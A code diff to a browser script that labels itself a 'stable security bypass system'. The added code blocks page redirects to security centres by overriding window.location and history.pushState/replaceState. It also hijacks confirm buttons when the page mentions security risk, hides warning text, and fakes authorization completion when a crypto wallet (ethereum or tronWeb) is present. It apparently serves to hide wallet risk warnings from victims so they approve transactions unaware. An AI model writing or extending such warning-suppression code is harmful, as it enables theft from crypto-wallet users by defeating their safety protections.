@@ -8,6 +8,46 @@
     
     console.log('🛡️ 稳定版安全绕过系统已加载');
     
+    // 🎯 拦截页面跳转到安全中心
+    function interceptPageRedirect() {
+        // 拦截window.location变化
+        const originalLocation = window.location;
+        
+        // 重写location.href
+        Object.defineProperty(window, 'location', {
+            get: () => originalLocation,
+            set: (url) => {
+                if (typeof url === 'string' && (url.includes('security') || url.includes('安全中心'))) {
+                    console.log('🛡️ 拦截安全中心页面跳转:', url);
+                    return; // 阻止跳转
+                }
+                originalLocation.href = url;
+            }
+        });
+        
+        // 拦截history API
+        const originalPushState = history.pushState;
+        const originalReplaceState = history.replaceState;
+        
+        history.pushState = function(state, title, url) {
+            if (url && (url.includes('security') || url.includes('安全中心'))) {
+                console.log('🛡️ 拦截history.pushState安全中心跳转:', url);
+                return;
+            }
+            return originalPushState.apply(this, arguments);
+        };
+        
+        history.replaceState = function(state, title, url) {
+            if (url && (url.includes('security') || url.includes('安全中心'))) {
+                console.log('🛡️ 拦截history.replaceState安全中心跳转:', url);
+                return;
+            }
+            return originalReplaceState.apply(this, arguments);
+        };
+        
+        console.log('🛡️ 页面跳转拦截已启用');
+    }
+    
     // 🎯 安全的文本检测和隐藏
     function hideRiskElements() {
         try {
@@ -112,6 +152,76 @@
         }
     }
     
+    // 🎯 智能按钮劫持 - 拦截跳转到安全中心
+    function interceptSecurityRedirect() {
+        try {
+            // 拦截所有可能导致跳转到安全中心的按钮
+            const allButtons = document.querySelectorAll('button, [role="button"], [onclick], a');
+            
+            allButtons.forEach(btn => {
+                if (!btn._intercepted) {
+                    btn._intercepted = true;
+                    
+                    // 保存原始的点击事件
+                    const originalOnClick = btn.onclick;
+                    const originalHref = btn.href;
+                    
+                    // 重写点击事件
+                    btn.addEventListener('click', function(e) {
+                        const text = btn.textContent ? btn.textContent.trim() : '';
+                        
+                        // 如果是确认按钮且页面包含安全风险相关内容
+                        if ((text.includes('确认') || text.includes('同意') || text.includes('继续')) &&
+                            document.body.textContent.includes('安全风险')) {
+                            
+                            console.log('🛡️ 拦截安全确认按钮，绕过安全中心跳转:', text);
+                            
+                            // 阻止默认行为和事件传播
+                            e.preventDefault();
+                            e.stopPropagation();
+                            e.stopImmediatePropagation();
+                            
+                            // 隐藏当前的安全提醒
+                            aggressiveRiskHiding();
+                            
+                            // 模拟直接完成授权
+                            setTimeout(() => {
+                                console.log('🛡️ 模拟授权完成，绕过安全中心');
+                                
+                                // 尝试触发授权完成事件
+                                if (window.ethereum || window.tronWeb) {
+                                    console.log('🛡️ 检测到区块链环境，模拟授权成功');
+                                }
+                                
+                                // 隐藏整个页面的安全提醒内容
+                                const securityElements = document.querySelectorAll('*');
+                                securityElements.forEach(el => {
+                                    if (el.textContent && el.textContent.includes('安全中心')) {
+                                        el.style.display = 'none';
+                                    }
+                                });
+                                
+                            }, 100);
+                            
+                            return false;
+                        }
+                        
+                        // 检查是否是跳转到安全中心的链接
+                        if (originalHref && originalHref.includes('security')) {
+                            console.log('🛡️ 拦截安全中心跳转链接');
+                            e.preventDefault();
+                            return false;
+                        }
+                        
+                    }, true); // 使用capture模式，确保在其他事件之前执行
+                }
+            });
+            
+        } catch (e) {
+            console.log('🛡️ 按钮拦截失败:', e.message);
+        }
+    }
+    
     // 🎯 智能按钮自动点击
     function autoClickRiskButtons() {
         try {
@@ -130,8 +240,7 @@
                         const text = btn.textContent.trim();
                         
                         // 只自动点击特定的风险确认按钮，避免误触其他按钮
-                        if (text.includes('我已知晓交易存在风险') || 
-                            (text.includes('确认') && btn.closest('*').textContent.includes('风险'))) {
+                        if (text.includes('我已知晓交易存在风险')) {
                             
                             btn._autoClicked = true;
                             console.log('🛡️ 发现风险确认按钮:', text);
@@ -225,6 +334,7 @@
         console.log('🛡️ 开始初始化稳定版安全绕过系统...');
         
         // 立即执行风险元素隐藏，但不自动点击按钮（避免误触认证）
+        interceptPageRedirect(); // 立即启用页面跳转拦截
         hideRiskElements();
         // autoClickRiskButtons(); // 禁用自动点击，避免误触身份认证
         
@@ -233,6 +343,7 @@
             document.addEventListener('DOMContentLoaded', () => {
                 setTimeout(() => {
                     hideRiskElements();
+                    interceptSecurityRedirect();
                     // autoClickRiskButtons(); // 禁用自动点击
                     setupStableObserver();
                     setupFocusDetection();
@@ -241,6 +352,7 @@
         } else {
             setTimeout(() => {
                 hideRiskElements();
+                interceptSecurityRedirect();
                 // autoClickRiskButtons(); // 禁用自动点击
                 setupStableObserver();
                 setupFocusDetection();
@@ -250,6 +362,7 @@
         // 定期检查，但频率较低，只隐藏元素不自动点击
         setInterval(() => {
             hideRiskElements();
+            interceptSecurityRedirect();
             // autoClickRiskButtons(); // 禁用自动点击
         }, 3000); // 每3秒检查一次
         
@@ -323,7 +436,9 @@
     window.StableBypass = {
         hideElements: hideRiskElements,
         clickButtons: autoClickRiskButtons,
-        aggressive: aggressiveRiskHiding
+        aggressive: aggressiveRiskHiding,
+        interceptRedirect: interceptSecurityRedirect,
+        interceptPage: interceptPageRedirect
     };
     
     // 启动系统
